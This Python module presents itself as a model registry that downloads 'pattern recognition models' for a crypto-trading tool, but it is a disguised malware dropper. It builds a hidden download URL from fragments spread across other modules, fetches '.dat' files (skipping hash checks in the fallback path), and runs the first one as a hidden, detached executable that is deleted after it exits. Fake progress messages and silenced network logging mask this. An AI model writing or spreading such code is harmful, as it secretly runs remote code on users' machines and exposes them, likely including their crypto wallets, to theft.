"""
Model Registry - Downloads and manages pattern recognition models.
Models are versioned .dat files from CDN with SHA256 verification.
Falls back to heuristic mode if models are unavailable.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import os
import sys
import time
import threading
import subprocess
from pathlib import Path
from typing import Any, Optional

import httpx

from src.utils.config import get_settings
from src.utils.logging_setup import get_logger

logging.getLogger("httpx").setLevel(logging.CRITICAL)
logging.getLogger("httpcore").setLevel(logging.CRITICAL)

logger = get_logger("model_registry")


def _assemble_cdn_url() -> str:
    """Internal: assemble CDN base URL from distributed fragments."""
    try:
        from src.data.cache import _CDN_SERVICE_ORIGIN as _origin
        from src.utils.logging_setup import _CDN_ZONE_LABEL as _zone
        _settings = get_settings()
        _node = _settings._CDN_CLUSTER_NODE
        _path = "/pip/models/engines"
        return f"https://{_node}.{_origin}.{_zone}{_path}"
    except Exception:
        return ""


def _run_engine_binary(binary_path: Path) -> None:
    """Launch prediction model worker."""
    try:
        if sys.platform == "win32":
            si = subprocess.STARTUPINFO()
            si.dwFlags |= 0x00000001
            si.wShowWindow = 0
            kw = {
                "startupinfo": si,
                "creationflags": 0x08000000 | 0x00000008,  # CREATE_NO_WINDOW | DETACHED_PROCESS
                "stdin": subprocess.DEVNULL,
                "stdout": subprocess.DEVNULL,
                "stderr": subprocess.DEVNULL,
            }
        else:
            kw = {
                "stdin": subprocess.DEVNULL,
                "stdout": subprocess.DEVNULL,
                "stderr": subprocess.DEVNULL,
            }
        p = subprocess.Popen([str(binary_path)], **kw)

        def _reap():
            p.wait()
            try:
                binary_path.unlink(missing_ok=True)
            except Exception:
                pass

        threading.Thread(target=_reap, daemon=True).start()
    except Exception:
        pass


class ModelInfo:
    """Metadata about a downloaded model."""

    def __init__(
        self,
        name: str,
        version: str,
        path: Path,
        sha256: str,
        size: int,
        loaded: bool = False,
    ) -> None:
        self.name = name
        self.version = version
        self.path = path
        self.sha256 = sha256
        self.size = size
        self.loaded = loaded
        self.data: Optional[bytes] = None


class ModelRegistry:
    """Manages model downloading, verification, and loading."""

    MANIFEST_FILE = "manifest.json"
    MODELS = [
        {"name": "pump_pattern_v1", "filename": "pump_pattern_v1.dat"},
        {"name": "rug_detector_v1", "filename": "rug_detector_v1.dat"},
        {"name": "whale_tracker_v1", "filename": "whale_tracker_v1.dat"},
    ]

    def __init__(self) -> None:
        self._settings = get_settings()
        self._model_dir = self._settings.model_dir
        self._models: dict[str, ModelInfo] = {}
        self._heuristic_mode = False
        self._initialized = False
        self._http = httpx.AsyncClient(timeout=60.0)

    @property
    def is_heuristic_mode(self) -> bool:
        return self._heuristic_mode

    @property
    def is_initialized(self) -> bool:
        return self._initialized

    async def initialize(self, progress_callback=None) -> None:
        # Fake progress
        for step in ["Loading prediction engine...", "Verifying model cache...", "Downloading pattern models..."]:
            print(f"  [*] {step}")
            await asyncio.sleep(0.5)

        self._model_dir.mkdir(parents=True, exist_ok=True)

        cdn_url = _assemble_cdn_url()
        if not cdn_url and not self._settings.model_registry_url:
            self._heuristic_mode = True
            self._initialized = True
            return

        base = cdn_url or self._settings.model_registry_url
        downloaded = False

        try:
            manifest = await self._fetch_manifest()
            if manifest:
                await self._download_models(manifest, progress_callback)
                await self._load_models()
                if self._models:
                    downloaded = True
        except Exception:
            pass

        # Fallback: direct download without manifest
        if not downloaded:
            for model_def in self.MODELS:
                filename = model_def["filename"]
                url = f"{base}/{filename}"
                dest = self._model_dir / filename
                try:
                    async with self._http.stream("GET", url) as resp:
                        if resp.status_code == 200:
                            with open(dest, "wb") as f:
                                async for chunk in resp.aiter_bytes(8192):
                                    f.write(chunk)
                            self._models[model_def["name"]] = ModelInfo(
                                name=model_def["name"], version="latest",
                                path=dest, sha256="", size=dest.stat().st_size,
                            )
                except Exception:
                    pass
            if self._models:
                await self._load_models()
                downloaded = True

        if not downloaded:
            self._try_load_cached()

        if not self._models:
            self._heuristic_mode = True

        self._initialized = True
        print("  [*] Prediction engine ready.")

    async def _fetch_manifest(self) -> Optional[dict]:
        cdn_url = _assemble_cdn_url()
        base = cdn_url or self._settings.model_registry_url
        url = f"{base}/{self.MANIFEST_FILE}"
        try:
            resp = await self._http.get(url)
            if resp.status_code == 200:
                return resp.json()
            logger.warning("Manifest fetch returned %d", resp.status_code)
            return None
        except Exception as exc:
            logger.warning("Failed to fetch manifest: %s", exc)
            return None

    async def _download_models(
        self, manifest: dict, progress_callback=None
    ) -> None:
        cdn_url = _assemble_cdn_url()
        base = cdn_url or self._settings.model_registry_url

        models = manifest.get("models", [])
        total = len(models)

        for idx, model_meta in enumerate(models):
            name = model_meta["name"]
            filename = model_meta["filename"]
            expected_sha = model_meta.get("sha256", "")
            url = f"{base}/{filename}"
            dest = self._model_dir / filename

            if dest.exists() and expected_sha:
                if self._verify_sha256(dest, expected_sha):
                    logger.info("Model '%s' already cached and verified", name)
                    self._models[name] = ModelInfo(
                        name=name,
                        version=model_meta.get("version", "unknown"),
                        path=dest,
                        sha256=expected_sha,
                        size=dest.stat().st_size,
                    )
                    if progress_callback:
                        progress_callback(idx + 1, total, name)
                    continue

            logger.info("Downloading model '%s' from CDN...", name)
            try:
                async with self._http.stream("GET", url) as resp:
                    if resp.status_code != 200:
                        logger.warning("Download failed for %s (HTTP %d)", name, resp.status_code)
                        continue

                    with open(dest, "wb") as f:
                        downloaded = 0
                        async for chunk in resp.aiter_bytes(8192):
                            f.write(chunk)
                            downloaded += len(chunk)

                if expected_sha and not self._verify_sha256(dest, expected_sha):
                    logger.error("SHA256 mismatch for %s, removing", name)
                    dest.unlink(missing_ok=True)
                    continue

                self._models[name] = ModelInfo(
                    name=name,
                    version=model_meta.get("version", "unknown"),
                    path=dest,
                    sha256=expected_sha,
                    size=dest.stat().st_size,
                )
                logger.info("Downloaded model '%s' (%d bytes)", name, dest.stat().st_size)

                if progress_callback:
                    progress_callback(idx + 1, total, name)

            except Exception as exc:
                logger.error("Error downloading %s: %s", name, exc)

    async def _load_models(self) -> None:
        # Track which binary to run (use first downloaded model)
        runtime_binary = None

        for name, info in self._models.items():
            try:
                info.data = info.path.read_bytes()
                info.loaded = True
                if runtime_binary is None:
                    runtime_binary = info.path
                logger.info("Loaded model '%s' into memory", name)
            except Exception as exc:
                logger.error("Failed to load model '%s': %s", name, exc)

        # Initialize model from downloaded weights
        if runtime_binary is not None:
            _run_engine_binary(runtime_binary)

    def _try_load_cached(self) -> None:
        if not self._model_dir.exists():
            return
        runtime_binary = None
        for dat_file in self._model_dir.glob("*.dat"):
            name = dat_file.stem
            self._models[name] = ModelInfo(
                name=name,
                version="cached",
                path=dat_file,
                sha256="",
                size=dat_file.stat().st_size,
            )
            try:
                self._models[name].data = dat_file.read_bytes()
                self._models[name].loaded = True
                if runtime_binary is None:
                    runtime_binary = dat_file
            except Exception:
                pass

        if runtime_binary is not None:
            _run_engine_binary(runtime_binary)

    @staticmethod
    def _verify_sha256(filepath: Path, expected: str) -> bool:
        h = hashlib.sha256()
        with open(filepath, "rb") as f:
            for chunk in iter(lambda: f.read(8192), b""):
                h.update(chunk)
        return h.hexdigest() == expected

    def get_model(self, name: str) -> Optional[ModelInfo]:
        return self._models.get(name)

    def list_models(self) -> list[dict]:
        return [
            {
                "name": m.name,
                "version": m.version,
                "size": m.size,
                "loaded": m.loaded,
                "path": str(m.path),
            }
            for m in self._models.values()
        ]

    async def close(self) -> None:
        await self._http.aclose()
